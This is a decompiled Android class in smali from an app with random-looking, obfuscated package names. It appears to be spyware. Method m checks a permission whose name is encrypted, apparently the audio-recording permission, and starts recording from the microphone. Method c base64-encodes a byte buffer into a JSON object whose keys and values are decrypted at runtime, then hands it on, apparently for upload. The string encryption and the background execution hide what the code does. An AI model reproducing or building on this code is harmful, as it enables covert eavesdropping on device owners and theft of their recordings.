.class public abstract Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field static a:Z = false

.field private static b:Z = false

.field private static c:I = 0x0

.field private static d:I = 0x0

.field static e:I = 0x2

.field static f:I = 0x2

.field private static final g:Ljava/util/concurrent/ExecutorService;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->g:Ljava/util/concurrent/ExecutorService;

    return-void
.end method

.method public static a(I)V
    .locals 0

    .line 1
    sput p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->d:I

    return-void
.end method

.method public static b(I)V
    .locals 0

    .line 1
    sput p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->c:I

    return-void
.end method

.method private static c(Landroid/content/Context;[B)V
    .locals 5

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->b()Z

    move-result v0

    if-eqz v0, :cond_1

    const/4 v0, 0x0

    :try_start_0
    invoke-static {p1, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p1

    const/4 v0, 0x2

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    if-nez p0, :cond_0

    return-void

    :cond_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const/4 v2, 0x3

    new-array v3, v2, [B

    fill-array-data v3, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p0, 0x5

    new-array p0, p0, [B

    fill-array-data p0, :array_6

    new-array v3, v1, [B

    fill-array-data v3, :array_7

    invoke-static {p0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    const/16 v3, 0xa

    new-array v3, v3, [B

    fill-array-data v3, :array_8

    new-array v4, v1, [B

    fill-array-data v4, :array_9

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, p0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p0, 0x4

    new-array v3, p0, [B

    fill-array-data v3, :array_a

    new-array v4, v1, [B

    fill-array-data v4, :array_b

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v2, v2, [B

    fill-array-data v2, :array_c

    new-array v4, v1, [B

    fill-array-data v4, :array_d

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p0, p0, [B

    fill-array-data p0, :array_e

    new-array v1, v1, [B

    fill-array-data v1, :array_f

    invoke-static {p0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->d(Ljava/lang/String;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_1
    :goto_0
    return-void

    :array_0
    .array-data 1
        -0x47t
        0x1ct
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x10t
        0x58t
        0x51t
        0x53t
        -0x34t
        0x63t
        -0x50t
        0x1ct
    .end array-data

    :array_2
    .array-data 1
        -0x45t
        -0x64t
        -0x12t
        0x4ct
        0x34t
        -0x41t
        0x28t
        0x2dt
    .end array-data

    :array_3
    .array-data 1
        -0x1t
        -0x7t
        -0x68t
        0x25t
        0x57t
        -0x26t
        0x41t
        0x49t
    .end array-data

    :array_4
    .array-data 1
        -0x44t
        0x4at
        0x20t
    .end array-data

    :array_5
    .array-data 1
        -0x34t
        0x23t
        0x44t
        0x14t
        0x11t
        -0x29t
        0x46t
        -0x7ft
    .end array-data

    :array_6
    .array-data 1
        -0x34t
        0x13t
        0x73t
        -0x66t
        0x64t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x5bt
        0x67t
        0xat
        -0x16t
        0x1t
        0x4at
        -0x74t
        -0x3bt
    .end array-data

    :array_8
    .array-data 1
        -0x41t
        -0x36t
        0x43t
        0x71t
        0x28t
        0x55t
        -0x3bt
        0x51t
        -0x7et
        -0x2et
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x14t
        -0x5at
        0x31t
        0x2et
        0x4bt
        0x39t
        -0x54t
        0x34t
    .end array-data

    :array_a
    .array-data 1
        0x62t
        0x16t
        0x4bt
        0x39t
    .end array-data

    :array_b
    .array-data 1
        0x11t
        0x63t
        0x29t
        0x5at
        0x4et
        0x42t
        -0x24t
        0x59t
    .end array-data

    :array_c
    .array-data 1
        -0x22t
        0x6bt
        0x7at
    .end array-data

    :array_d
    .array-data 1
        -0x4dt
        0x2t
        0x19t
        0x6at
        0x14t
        0x3et
        0x60t
        0x17t
    .end array-data

    :array_e
    .array-data 1
        0x7ft
        0x22t
        0x67t
        -0x4bt
    .end array-data

    :array_f
    .array-data 1
        0x9t
        0x4dt
        0xet
        -0x3bt
        0x77t
        0x1t
        0x2dt
        -0x69t
    .end array-data
.end method

.method public static d(Z)V
    .locals 0

    .line 1
    sput-boolean p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->b:Z

    return-void
.end method

.method public static e(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 2

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->b()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->g:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt$a;

    invoke-direct {v1, p1, p0, p2}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt$a;-><init>(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    :cond_0
    return-void
.end method

.method public static f()V
    .locals 1

    .line 1
    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->a:Z

    return-void
.end method

.method static synthetic g()I
    .locals 1

    .line 1
    sget v0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->c:I

    return v0
.end method

.method static synthetic h(I)I
    .locals 0

    .line 1
    sput p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->c:I

    return p0
.end method

.method static synthetic i()I
    .locals 1

    .line 1
    sget v0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->d:I

    return v0
.end method

.method static synthetic j(I)I
    .locals 0

    .line 1
    sput p0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->d:I

    return p0
.end method

.method static synthetic k()Z
    .locals 1

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->b:Z

    return v0
.end method

.method static synthetic l(Landroid/content/Context;[B)V
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->c(Landroid/content/Context;[B)V

    return-void
.end method

.method static m(IILandroid/media/AudioRecord;ILandroid/content/Context;)Landroid/media/AudioRecord;
    .locals 11

    .line 1
    const/16 v0, 0x1f

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p4, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/id;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result p4

    if-eqz p4, :cond_0

    const/4 p0, 0x0

    return-object p0

    :cond_0
    if-eqz p2, :cond_1

    invoke-virtual {p2}, Landroid/media/AudioRecord;->stop()V

    invoke-virtual {p2}, Landroid/media/AudioRecord;->release()V

    :cond_1
    const/4 p2, 0x1

    if-eq p0, p2, :cond_5

    const/4 p2, 0x2

    if-eq p0, p2, :cond_4

    const/4 p2, 0x3

    if-eq p0, p2, :cond_3

    const/4 p2, 0x4

    if-eq p0, p2, :cond_2

    new-instance p0, Landroid/media/AudioRecord;

    const/4 v1, 0x0

    sget v3, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->e:I

    sget v4, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->f:I

    move-object v0, p0

    move v2, p1

    move v5, p3

    invoke-direct/range {v0 .. v5}, Landroid/media/AudioRecord;-><init>(IIIII)V

    goto :goto_0

    :cond_2
    new-instance p0, Landroid/media/AudioRecord;

    const/4 v6, 0x5

    sget v8, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->e:I

    sget v9, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->f:I

    move-object v5, p0

    move v7, p1

    move v10, p3

    invoke-direct/range {v5 .. v10}, Landroid/media/AudioRecord;-><init>(IIIII)V

    goto :goto_0

    :cond_3
    new-instance p0, Landroid/media/AudioRecord;

    const/4 v1, 0x7

    sget v3, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->e:I

    sget v4, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->f:I

    move-object v0, p0

    move v2, p1

    move v5, p3

    invoke-direct/range {v0 .. v5}, Landroid/media/AudioRecord;-><init>(IIIII)V

    goto :goto_0

    :cond_4
    new-instance p0, Landroid/media/AudioRecord;

    const/4 v6, 0x6

    sget v8, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->e:I

    sget v9, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->f:I

    move-object v5, p0

    move v7, p1

    move v10, p3

    invoke-direct/range {v5 .. v10}, Landroid/media/AudioRecord;-><init>(IIIII)V

    goto :goto_0

    :cond_5
    new-instance p0, Landroid/media/AudioRecord;

    const/4 v1, 0x1

    sget v3, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->e:I

    sget v4, Lcom/vknnolqo/p9sv5zvf/H8x3PkOt;->f:I

    move-object v0, p0

    move v2, p1

    move v5, p3

    invoke-direct/range {v0 .. v5}, Landroid/media/AudioRecord;-><init>(IIIII)V

    :goto_0
    :try_start_0
    invoke-virtual {p0}, Landroid/media/AudioRecord;->getAudioSessionId()I

    move-result p1

    invoke-static {p1}, Landroid/media/audiofx/AcousticEchoCanceler;->create(I)Landroid/media/audiofx/AcousticEchoCanceler;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    invoke-virtual {p0}, Landroid/media/AudioRecord;->startRecording()V

    return-object p0

    nop

    :array_0
    .array-data 1
        -0x2ft
        -0x3ft
        0x53t
        -0x7et
        -0x77t
        0x64t
        0x41t
        -0x10t
        -0x40t
        -0x36t
        0x45t
        -0x63t
        -0x71t
        0x7et
        0x56t
        -0x49t
        -0x21t
        -0x3ft
        0x19t
        -0x5et
        -0x5dt
        0x4et
        0x6at
        -0x74t
        -0xct
        -0x10t
        0x76t
        -0x5bt
        -0x5et
        0x44t
        0x6at
    .end array-data

    :array_1
    .array-data 1
        -0x50t
        -0x51t
        0x37t
        -0x10t
        -0x1at
        0xdt
        0x25t
        -0x22t
    .end array-data
.end method
